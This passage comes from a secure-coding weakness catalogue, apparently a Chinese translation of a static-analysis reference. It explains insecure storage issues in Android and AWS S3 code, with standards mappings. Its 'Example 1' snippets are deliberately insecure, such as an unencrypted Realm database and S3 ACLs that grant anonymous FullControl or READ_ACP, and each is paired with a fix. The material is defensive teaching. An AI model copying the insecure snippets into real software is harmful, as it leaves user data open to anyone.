class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">        File httpCacheDir = new File(context.getCacheDir(), &quot;http&quot;);</span><br><span class="line"></span><br><span class="line">        long httpCacheSize = 10 * 1024 * 1024; // 10 MiB</span><br><span class="line"></span><br><span class="line">        HttpResponseCache.install(httpCacheDir, httpCacheSize);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">        Log.i(TAG, &quot;HTTP response cache installation failed:&quot; + e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> protected void onStop() &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    HttpResponseCache cache = HttpResponseCache.getInstalled();</span><br><span class="line"></span><br><span class="line">    if (cache != null) &#123;</span><br><span class="line"></span><br><span class="line">        cache.flush();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-17"><a href="#REFERENCES-17" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311, CWE ID 312, CWE ID 313, CWE ID 522 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001350, CCI-002475 </p>
<p>[5] Standards Mapping - FIPS200 MP </p>
<p>[6] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.10.2 Service Authentication Requirements, 2.10.3 Service Authentication Requirements, 3.7.1 Defenses Against Session Management Exploits, 6.1.1 Data Classification, 6.1.2 Data Classification, 6.1.3 Data Classification, 6.2.1 Algorithms, 8.1.6 General Data Protection, 8.1.6 General Data Protection, 8.2.2 Client-side Data Protection, 9.2.3 Server Communications Security Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.3 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.3 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.3 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.3 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.1 - Use of Cryptography </p>
<p>[20] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311 </p>
<p>[21] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311 </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001350 CAT II, APSC-DV-002340 CAT II </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-Missing-Database-Encryption"><a href="#Insecure-Storage-Missing-Database-Encryption" class="headerlink" title="Insecure Storage: Missing Database Encryption"></a>Insecure Storage: Missing Database Encryption</h4><h5 id="ABSTRACT-18"><a href="#ABSTRACT-18" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>所标识的方法建立到未加密数据库的连接。</p>
<h5 id="EXPLANATION-18"><a href="#EXPLANATION-18" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>应用程序文件可以由根设备上或未加密备份中的其他应用程序访问。由于用户可以决定越狱其设备或执行未加密的备份，因此最好对包含敏感数据的数据库进行加密。</p>
<p>示例 1：以下代码建立到未加密的 Realm 数据库的连接：</p>
<pre><code>`Realm realm = Realm.getDefaultInstance();`
</code></pre><h5 id="RECOMMENDATIONS-17"><a href="#RECOMMENDATIONS-17" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>根据用户配置，文件系统上的文件可以保持未加密状态。为了保护用户数据，最好对数据库进行加密。</p>
<p>示例 2：以下代码使用 Realm 数据库本机加密，这种加密使用 AES-256+SHA2 透明地保护静态数据库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RealmConfiguration realmConfiguration = new RealmConfiguration.Builder().encryptionKey(getKeyFromKeystore()).build();</span><br><span class="line"></span><br><span class="line">Realm realm = Realm.getInstance(realmConfiguration);</span><br></pre></td></tr></table></figure>
<p>要在单个设备上专门创建 Realm 文件以保证这些文件保留在设备上，最安全的方式将加密密钥保存到 Android Keystore。</p>
<h5 id="REFERENCES-18"><a href="#REFERENCES-18" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Realm Database Encryption Realm</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 311 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[5] Standards Mapping - FIPS200 MP </p>
<p>[6] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 6.2.1 Algorithms, 8.1.6 General Data Protection </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.3 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.3 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.3 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.3 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 6.3 - Sensitive Data Protection, Control Objective 7 - Use of Cryptography </p>
<p>[20] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311 </p>
<p>[21] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311 </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-S3-Full-Anonymous-Access"><a href="#Insecure-Storage-S3-Full-Anonymous-Access" class="headerlink" title="Insecure Storage: S3 Full Anonymous Access"></a>Insecure Storage: S3 Full Anonymous Access</h4><h5 id="ABSTRACT-19"><a href="#ABSTRACT-19" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序可授予对 AWS S3 存储桶或对象的完全匿名访问权限。</p>
<h5 id="EXPLANATION-19"><a href="#EXPLANATION-19" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>授予对存储桶或对象的完全匿名访问权限将允许攻击者读取内容或将其替换为恶意内容。</p>
<p>示例 1：以下代码设置的Access Control Policy可授予对 foo 存储桶的完全匿名访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">Grantee allusers = Grantee.builder().uri(&quot;http://acs.amazonaws.com/groups/global/AllUsers&quot;).build();</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;FullControl&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(allusers).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-18"><a href="#RECOMMENDATIONS-18" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终应用最小权限原则并授予程序所需的最小权限集。</p>
<p>示例 2：以下代码设置的Access Control Policy可基于用户的电子邮件地址授予对单个用户的完全访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">EmailAddressGrantee grantee = new EmailAddressGrantee(email);</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;FullControl&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(grantee).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-19"><a href="#REFERENCES-19" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 284, CWE ID 359 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.4.2 Access Control Architectural Requirements, 1.4.4 Access Control Architectural Requirements, 8.3.4 Sensitive Private Data, 10.2.1 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-S3-Read-ACP-Anonymous-Access"><a href="#Insecure-Storage-S3-Read-ACP-Anonymous-Access" class="headerlink" title="Insecure Storage: S3 Read ACP Anonymous Access"></a>Insecure Storage: S3 Read ACP Anonymous Access</h4><h5 id="ABSTRACT-20"><a href="#ABSTRACT-20" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序可授予匿名读取 AWS S3 存储桶或对象的访问控制策略 (ACP) 的权限。</p>
<h5 id="EXPLANATION-20"><a href="#EXPLANATION-20" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>授予匿名读取存储桶或对象的访问控制策略 (ACP) 的权限将允许攻击者发现可以检索或覆盖的对象。</p>
<p>示例 1：以下代码设置的Access Control Policy可授予对 foo 存储桶的匿名读取 ACP 访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">Grantee allusers = Grantee.builder().uri(&quot;http://acs.amazonaws.com/groups/global/AllUsers&quot;).build();</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;READ_ACP&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(allusers).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-19"><a href="#RECOMMENDATIONS-19" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终应用最小权限原则并授予程序所需的最小权限集。</p>
<p>示例 2：以下代码设置的Access Control Policy可基于用户的电子邮件地址授予对单个用户的访问控制策略 (ACP) 读取访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">EmailAddressGrantee grantee = new EmailAddressGrantee(email);</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;READ_ACP&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(grantee).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-20"><a href="#REFERENCES-20" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 284, CWE ID 359 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.4.2 Access Control Architectural Requirements, 1.4.4 Access Control Architectural Requirements, 8.3.4 Sensitive Private Data, 10.2.1 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-S3-Read-Anonymous-Access"><a href="#Insecure-Storage-S3-Read-Anonymous-Access" class="headerlink" title="Insecure Storage: S3 Read Anonymous Access"></a>Insecure Storage: S3 Read Anonymous Access</h4><h5 id="ABSTRACT-21"><a href="#ABSTRACT-21" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序可授予对 AWS S3 存储桶或对象的匿名读取访问权限。</p>
<h5 id="EXPLANATION-21"><a href="#EXPLANATION-21" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>授予对存储桶或对象的匿名读取访问权限将允许攻击者读取其内容。</p>
<p>示例 1：以下代码设置的Access Control Policy可授予对 foo 存储桶的匿名读取访问权限。</p>
